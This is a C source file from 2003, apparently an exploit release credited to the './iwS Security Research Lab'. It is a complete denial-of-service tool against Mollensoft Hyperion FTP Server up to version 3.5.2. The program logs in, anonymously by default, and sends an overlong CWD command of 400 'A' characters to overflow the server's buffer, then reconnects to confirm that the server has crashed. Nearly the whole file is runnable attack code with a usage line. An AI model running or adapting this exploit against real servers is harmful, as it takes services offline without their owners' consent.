/*
 * ## PRIVATE !!! ## DO NOT DISTRIBUTE !!! ##
 * ## FOR EDUCATIONAL PURPOISES ONLY   !!! ##
 *
 * 17/06/2003 @4.34PM
 *
 * ./iwS Security Research Lab presents
 * Mollensoft Hyperion FTP Server <= 3.5.2 DoS
 *
 * as described in the paper from dr_insane located at
 * http://packetstormsecurity.nl/0306-advisories/MollensoftFTPServer3.5.2.txt
 * this server is crappy and vulnerable to overflows in this commands:
 * CWD, MKD, RMD, STAT, NLST.
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>

// prototypes
void    logintoftp();
void    banner();
void    usage(char *);
long    getip(char *);

// global vars
char    name[128], pass[128];
int     suck; // socket heheh :D
size_t  port; // ftp port

/* this simple procedure handles the ftp *
 * login sequence                        */
void    logintoftp()
{
    char    snd[1024], rcv[1024]; // send&receive buffers
    int n; // socket

    /* username string */
    memset(snd, '\0', 1024);
    sprintf(snd, "USER %s\r\n", name);
    write(suck, snd, strlen(snd));

    /* waits for server answer */
    while((n = read(suck, rcv, sizeof(rcv))) > 0)
    {
        rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL) break;
    }

    /* password string */
    memset(snd, '\0', 1024);
    sprintf(snd, "PASS %s\r\n", pass);
    write(suck, snd, strlen(snd));

    /* waits for server answer */
    while((n = read(suck, rcv, sizeof(rcv))) > 0)
    {
        rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL) break;
    }

    return;
}

/* this one just takes the hostname *
 * or the ip from argv and converts *
 * it to something useful :P        */
long    getip(char *name)
{
    struct  hostent *hp;
    long    ip;

    if((ip = inet_addr(name)) == -1)
    {
        if((hp = gethostbyname(name)) == NULL)
        {
            fprintf(stderr, "[!] couldn't resolve host.\n");
            exit(-1);
        }
        memcpy(&ip, (hp->h_addr), 4);
    }

    return ip;
}

/* something very beauty\useful */
void    banner()
{
    printf("\n[@] ./iwS Security Research Lab\n"
         " + Daemon: MollenSoft FTPD <= 3.5.2\n"
         " + Bug: Remote CWD Buffer Overflow (DoS)\n"
         " + Greets: #iwSpub @IRCnet\n");
}

void    usage(char *cmd)
{
        fprintf(stderr, "\n[?] usage: %s <host> [-l login] [-p pass] [-P port]\n\n", cmd);
        exit(-1);
}

/* main stuff in here */
int main(int argc, char **argv)
{
    char    arg, **fakeargv = (char **)malloc(sizeof(char *)*(argc + 1));
    char    sendln[1024], recvln[1024];
    char    bof[400];
    char    dos[500];
    struct  sockaddr_in socka;
    int i, n;

    port = htons(21);

    banner();

    if(argc < 2) usage(argv[0]);

    for(i = 0; i < argc; i++)
    {
        fakeargv[i] = (char *)malloc(strlen(argv[i]) + 1);
        strncpy(fakeargv[i], argv[i], strlen(argv[i]) + 1);
    }

    fakeargv[argc] = NULL;

    while((arg = getopt(argc, fakeargv, "l:p:P:")) != EOF)
        switch(arg)
        {
            case 'l':
                strncpy(name, optarg, 128);
                break;
            case 'p':
                strncpy(pass, optarg, 128);
                break;
            case 'P':
                port = atoi(optarg);
                break;

            default:
                usage(argv[0]);
                break;
        }

    if(name[0] == 0) strcpy(name, "anonymous");
    if(pass[0] == 0) strcpy(pass, "iwS@irc.net");

    /* buffers reset */
    bzero(&socka, sizeof(socka));
    bzero(recvln, sizeof(recvln));
    bzero(sendln, sizeof(sendln));
    bzero(dos, sizeof(dos));
    bzero(bof, sizeof(bof));

    /* socket parameters */
    socka.sin_family = AF_INET;
    socka.sin_port   = htons(port);
    socka.sin_addr.s_addr = getip(argv[1]);

    /* socket creation */
    if((suck = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("\n[!] socket error:");
        exit(-1);
    }

    /* establishing connection to host */
    if(connect(suck, (struct sockaddr *)&socka, sizeof(socka)) < 0)
    {
        perror("\n[!] connect() error:");
        exit(-1);
    }

    /* we wait for server answer */
    while((n = read(suck, recvln, sizeof(recvln))) > 0)
    {
        recvln[n] = '\0';
        if(strchr(recvln, '\n') != NULL) break;
    }

    printf("[#] logging in with %s:%s... ", name, pass);
    logintoftp(suck); // let's login...
    printf("done.\n");

    printf("[§] sending evil packet... ");

    /* putting NULL char in the end of the buffer */
    memset(dos, '\0', 500);

    /* let's fill the buffer with A's */
    for(i = 0; i < sizeof(bof); i++)
        bof[i] = 'A';

    /* preparing the evil buffer formed by   *
     * CWD + lotsa A's + .iwS. 'cos i'm lame */
    sprintf(dos, "CWD %s.iwS.\r\n", bof);
    write(suck, dos, sizeof(dos)); // go! ;D

    printf("sent!\n");

    /* let's wait a bit */
    printf("[i] idling 10 seconds... please wait.\n");
    sleep(10);

    /* i want to know if it really worked or not */
    printf("[#] checking if worked... ");
    close(suck);
        if((suck = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror("\n[!] socket error:");
                exit(-1);
        }
        if(connect(suck, (struct sockaddr *)&socka, sizeof(socka)) < 0)
        printf("yeah!\n\n"); // yeah!
    else
        printf("nope!\n\n"); // doh!

    close(suck); // cya :D
}

/* _EOF_ */

